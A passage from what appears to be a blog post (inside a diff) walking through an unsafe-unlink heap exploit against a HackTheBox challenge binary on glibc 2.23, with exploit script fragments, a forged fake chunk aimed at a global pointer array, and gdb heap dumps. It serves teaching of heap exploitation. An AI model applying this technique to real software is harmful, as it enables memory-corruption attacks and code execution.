+</span></span><span class="line"><span class="cl">      <span class="nf">malloc_printerr</span> <span class="p">(</span><span class="err">&#34;</span><span class="no">corrupted</span> <span class="no">size</span> <span class="no">vs.</span> <span class="no">prev_size</span><span class="err">&#34;</span><span class="p">)</span><span class="c1">;			      \
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">FD</span> <span class="err">=</span> <span class="no">P-</span><span class="err">&gt;</span><span class="no">fd</span><span class="c1">;								      \
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">BK</span> <span class="err">=</span> <span class="no">P-</span><span class="err">&gt;</span><span class="no">bk</span><span class="c1">;								      \
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">if</span> <span class="p">(</span><span class="no">__builtin_expect</span> <span class="p">(</span><span class="no">FD-</span><span class="err">&gt;</span><span class="no">bk</span> <span class="p">!</span><span class="err">=</span> <span class="no">P</span> <span class="err">||</span> <span class="no">BK-</span><span class="err">&gt;</span><span class="no">fd</span> <span class="p">!</span><span class="err">=</span> <span class="no">P</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>		      <span class="err">\</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">malloc_printerr</span> <span class="p">(</span><span class="err">&#34;</span><span class="no">corrupted</span> <span class="no">double-linked</span> <span class="no">list</span><span class="err">&#34;</span><span class="p">)</span><span class="c1">;	
+</span></span></span></code></pre></div><p>To be precise, we need to get through the 2 checks to call unlink for our exploit, those checks include:-</p>
+<ul>
+<li>The <code>prev_size</code> should not be equal to the size of the next chunk.</li>
+<li>Then the other check is <code>FD</code> here is the <code>fd</code> address pointed by our chunk and vice versa should point to the chunk itself.</li>
+</ul>
+<h1 id="exploitation" class="relative group">Exploitation <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#exploitation" aria-label="Anchor">#</a></span></h1><p>Theories aside, it&rsquo;s time to go into the exploitation phase, let&rsquo;s create a exploit template to interact with the service:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">roppy</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">allocate</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt;&gt; &#34;</span><span class="p">,</span> <span class="s2">&#34;1&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt;&gt; &#34;</span><span class="p">,</span> <span class="s2">&#34;2&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt;&gt; &#34;</span><span class="p">,</span> <span class="s2">&#34;3&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">exploit</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># exploit</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./chapter1&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;chapter1&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">exploit</span><span class="p">()</span>
+</span></span></code></pre></div><p>So, next up, we will allocate chunks, five chunks would be good, of same size:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Created 5 chunks of size: 0x88&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mh">0x88</span><span class="p">,</span> <span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0x88</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mh">0x88</span><span class="p">,</span> <span class="s2">&#34;B&#34;</span><span class="o">*</span><span class="mh">0x88</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mh">0x88</span><span class="p">,</span> <span class="s2">&#34;C&#34;</span><span class="o">*</span><span class="mh">0x88</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mh">0x88</span><span class="p">,</span> <span class="s2">&#34;D&#34;</span><span class="o">*</span><span class="mh">0x88</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mh">0x88</span><span class="p">,</span> <span class="s2">&#34;E&#34;</span><span class="o">*</span><span class="mh">0x88</span><span class="p">)</span>
+</span></span></code></pre></div><p>Now, we will run the exploit and see the chunks in gdb:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">0</span> <span class="err">[08:11:04]</span> <span class="nf">vagrant@oracle</span><span class="p">(</span><span class="no">oracle</span><span class="p">)</span> <span class="no">HackTheBox</span><span class="err">&gt;</span> <span class="no">python3</span> <span class="no">chapter1.py</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="err">+</span><span class="p">]</span> <span class="no">Starting</span> <span class="no">program</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">chapter1</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">PID</span> <span class="mi">2417</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Analyzing</span> <span class="err">/</span><span class="no">media</span><span class="err">/</span><span class="no">sf_Pwning</span><span class="err">/</span><span class="no">HackTheBox</span><span class="err">/</span><span class="no">chapter1</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Analyzing</span> <span class="err">/</span><span class="no">home</span><span class="err">/</span><span class="no">vagrant</span><span class="err">/</span><span class="no">tools</span><span class="err">/</span><span class="no">LibcSearcher</span><span class="err">/</span><span class="no">libc-database</span><span class="err">/</span><span class="no">db</span><span class="err">/</span><span class="no">libc6_2.23-0ubuntu10_amd64.so</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Created</span> <span class="mi">5</span> <span class="no">chunks</span> <span class="no">of</span> <span class="no">size</span><span class="p">:</span> <span class="mi">0x88</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="na">..snip..</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">heap</span> <span class="no">chunks</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Chunk</span><span class="p">(</span><span class="no">addr</span><span class="err">=</span><span class="mi">0x1945010</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x90</span><span class="p">,</span> <span class="no">flags</span><span class="err">=</span><span class="no">PREV_INUSE</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="err">[0</span><span class="nf">x0000000001945010</span>     <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span>    <span class="no">AAAAAAAAAAAAAAAA</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Chunk</span><span class="p">(</span><span class="no">addr</span><span class="err">=</span><span class="mi">0x19450a0</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x90</span><span class="p">,</span> <span class="no">flags</span><span class="err">=</span><span class="no">PREV_INUSE</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="err">[0</span><span class="nf">x00000000019450a0</span>     <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span>    <span class="no">BBBBBBBBBBBBBBBB</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Chunk</span><span class="p">(</span><span class="no">addr</span><span class="err">=</span><span class="mi">0x1945130</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x90</span><span class="p">,</span> <span class="no">flags</span><span class="err">=</span><span class="no">PREV_INUSE</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="err">[0</span><span class="nf">x0000000001945130</span>     <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span>    <span class="no">CCCCCCCCCCCCCCCC</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Chunk</span><span class="p">(</span><span class="no">addr</span><span class="err">=</span><span class="mi">0x19451c0</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x90</span><span class="p">,</span> <span class="no">flags</span><span class="err">=</span><span class="no">PREV_INUSE</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="err">[0</span><span class="nf">x00000000019451c0</span>     <span class="mi">44</span> <span class="mi">44</span> <span class="mi">44</span> <span class="mi">44</span> <span class="mi">44</span> <span class="mi">44</span> <span class="mi">44</span> <span class="mi">44</span> <span class="mi">44</span> <span class="mi">44</span> <span class="mi">44</span> <span class="mi">44</span> <span class="mi">44</span> <span class="mi">44</span> <span class="mi">44</span> <span class="mi">44</span>    <span class="no">DDDDDDDDDDDDDDDD</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Chunk</span><span class="p">(</span><span class="no">addr</span><span class="err">=</span><span class="mi">0x1945250</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x90</span><span class="p">,</span> <span class="no">flags</span><span class="err">=</span><span class="no">PREV_INUSE</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="err">[0</span><span class="nf">x0000000001945250</span>     <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span>    <span class="no">EEEEEEEEEEEEEEEE</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Chunk</span><span class="p">(</span><span class="no">addr</span><span class="err">=</span><span class="mi">0x19452e0</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x20d30</span><span class="p">,</span> <span class="no">flags</span><span class="err">=</span><span class="no">PREV_INUSE</span><span class="p">)</span>  <span class="err">←</span>  <span class="no">top</span> <span class="no">chunk</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">x</span><span class="err">/</span><span class="mi">10</span><span class="no">xg</span> <span class="mi">0x6020c0</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x6020c0:</span>	<span class="err">0</span><span class="nf">x0000000001945010</span>	<span class="mi">0x00000000019450a0</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x6020d0:</span>	<span class="err">0</span><span class="nf">x0000000001945130</span>	<span class="mi">0x00000000019451c0</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x6020e0:</span>	<span class="err">0</span><span class="nf">x0000000001945250</span>	<span class="mi">0x0000000000000000</span>
+</span></span></code></pre></div><p>Here, we have 5 chunks on the heap with the size <code>0x90</code> and then we have a global array having the pointers of the allocated chunk. Our target is to get control of the <code>0x6020c0</code> global array, so that we can manipulate the pointers stored within to it to get r/w primitive.</p>
+<p>The plan here is to forge a fake chunk, such that we can point the <code>fd</code> and <code>bk</code> to the global array, this will be done with:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Preparing a fake chunk...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">global_ptr</span> <span class="o">-</span> <span class="mh">0x18</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">global_ptr</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;X&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Fake chunk:</span><span class="se">\n</span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span><span class="p">(</span><span class="n">hexdump</span><span class="p">(</span><span class="n">payload</span><span class="p">)))</span>
+</span></span></code></pre></div><p>The fake chunk, if seen visually looks like:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">-------------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span>    <span class="err">0</span>                  <span class="err">|</span>     <span class="err">0</span>     <span class="err">|</span>
+</span></span><span class="line"><span class="cl"><span class="err">-------------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span>          <span class="nf">global_ptr</span> <span class="p">-</span> <span class="mi">0x18</span>        <span class="err">|</span>
+</span></span><span class="line"><span class="cl"><span class="err">-------------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span>          <span class="nf">global_ptr</span> <span class="p">-</span> <span class="mi">0x10</span>        <span class="err">|</span>
+</span></span><span class="line"><span class="cl"><span class="err">-------------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span>                                   <span class="err">|</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span>              <span class="nf">XXXXXXXXXX</span>           <span class="err">|</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span>                                   <span class="err">|</span>
+</span></span><span class="line"><span class="cl"><span class="err">-------------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="err">|</span>   <span class="err">0</span><span class="nf">x80</span>         <span class="err">|</span>         <span class="mi">0x90</span>     <span class="err">|</span>
+</span></span><span class="line"><span class="cl"><span class="err">------------------------------------</span>
+</span></span></code></pre></div><p>Now, running the exploit:-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">0</span> <span class="err">[08:31:09]</span> <span class="nf">vagrant@oracle</span><span class="p">(</span><span class="no">oracle</span><span class="p">)</span> <span class="no">HackTheBox</span><span class="err">&gt;</span> <span class="no">python3</span> <span class="no">chapter1.py</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="err">+</span><span class="p">]</span> <span class="no">Starting</span> <span class="no">program</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">chapter1</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">PID</span> <span class="mi">2777</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Analyzing</span> <span class="err">/</span><span class="no">media</span><span class="err">/</span><span class="no">sf_Pwning</span><span class="err">/</span><span class="no">HackTheBox</span><span class="err">/</span><span class="no">chapter1</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Analyzing</span> <span class="err">/</span><span class="no">home</span><span class="err">/</span><span class="no">vagrant</span><span class="err">/</span><span class="no">tools</span><span class="err">/</span><span class="no">LibcSearcher</span><span class="err">/</span><span class="no">libc-database</span><span class="err">/</span><span class="no">db</span><span class="err">/</span><span class="no">libc6_2.23-0ubuntu10_amd64.so</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Created</span> <span class="mi">5</span> <span class="no">chunks</span> <span class="no">of</span> <span class="no">size</span><span class="p">:</span> <span class="mi">0x88</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Paused</span> <span class="p">[</span><span class="no">Press</span> <span class="no">any</span> <span class="no">key</span> <span class="no">to</span> <span class="no">continue</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Preparing</span> <span class="no">a</span> <span class="no">fake</span> <span class="no">chunk...</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Fake</span> <span class="no">chunk</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="err">00000000:</span>  <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span>  <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span>  <span class="err">|</span><span class="na">................</span><span class="err">|</span>
+</span></span><span class="line"><span class="cl">    <span class="err">00000010:</span>  <span class="nf">c0</span> <span class="mi">20</span> <span class="mi">60</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="no">c8</span> <span class="mi">20</span> <span class="mi">60</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>  <span class="err">|</span><span class="p">.</span> <span class="err">`</span><span class="no">......</span> <span class="err">`</span><span class="no">.....</span><span class="err">|</span>
+</span></span><span class="line"><span class="cl">    <span class="err">00000020:</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">|</span><span class="nf">XXXXXXXXXXXXXXXX</span><span class="err">|</span>
+</span></span><span class="line"><span class="cl">    <span class="err">00000030:</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">|</span><span class="nf">XXXXXXXXXXXXXXXX</span><span class="err">|</span>
+</span></span><span class="line"><span class="cl">    <span class="err">00000040:</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">|</span><span class="nf">XXXXXXXXXXXXXXXX</span><span class="err">|</span>
+</span></span><span class="line"><span class="cl">    <span class="err">00000050:</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">|</span><span class="nf">XXXXXXXXXXXXXXXX</span><span class="err">|</span>
+</span></span><span class="line"><span class="cl">    <span class="err">00000060:</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">|</span><span class="nf">XXXXXXXXXXXXXXXX</span><span class="err">|</span>
+</span></span><span class="line"><span class="cl">    <span class="err">00000070:</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span> <span class="err">58</span>  <span class="err">|</span><span class="nf">XXXXXXXXXXXXXXXX</span><span class="err">|</span>
+</span></span><span class="line"><span class="cl">    <span class="err">00000080:</span>  <span class="err">80</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span>                           <span class="err">|</span><span class="na">........</span><span class="err">|</span>
+</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Editing</span> <span class="no">chunk</span> <span class="mi">3</span> <span class="no">with</span> <span class="no">a</span> <span class="no">fakr</span> <span class="no">chunk</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="na">..snip..</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">heap</span> <span class="no">chunks</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Chunk</span><span class="p">(</span><span class="no">addr</span><span class="err">=</span><span class="mi">0x230a010</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x90</span><span class="p">,</span> <span class="no">flags</span><span class="err">=</span><span class="no">PREV_INUSE</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="err">[0</span><span class="nf">x000000000230a010</span>     <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span>    <span class="no">AAAAAAAAAAAAAAAA</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Chunk</span><span class="p">(</span><span class="no">addr</span><span class="err">=</span><span class="mi">0x230a0a0</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x90</span><span class="p">,</span> <span class="no">flags</span><span class="err">=</span><span class="no">PREV_INUSE</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="err">[0</span><span class="nf">x000000000230a0a0</span>     <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span>    <span class="no">BBBBBBBBBBBBBBBB</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Chunk</span><span class="p">(</span><span class="no">addr</span><span class="err">=</span><span class="mi">0x230a130</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x90</span><span class="p">,</span> <span class="no">flags</span><span class="err">=</span><span class="no">PREV_INUSE</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="err">[0</span><span class="nf">x000000000230a130</span>     <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span>    <span class="no">CCCCCCCCCCCCCCCC</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Chunk</span><span class="p">(</span><span class="no">addr</span><span class="err">=</span><span class="mi">0x230a1c0</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x90</span><span class="p">,</span> <span class="no">flags</span><span class="err">=</span><span class="no">PREV_INUSE</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="err">[0</span><span class="nf">x000000000230a1c0</span>     <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>    <span class="no">................</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nf">Chunk</span><span class="p">(</span><span class="no">addr</span><span class="err">=</span><span class="mi">0x230a250</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x90</span><span class="p">,</span> <span class="no">flags</span><span class="err">=</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="err">[0</span><span class="nf">x000000000230a250</span>     <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span>    <span class="no">EEEEEEEEEEEEEEEE</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">x</span><span class="err">/</span><span class="mi">49</span><span class="no">xg</span> <span class="mi">0x230a1c0</span> <span class="p">-</span> <span class="mi">0x10</span>
+</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x230a1b0:</span>	<span class="err">0</span><span class="nf">x4343434343434343</span>	<span class="mi">0x0000000000000091</span>
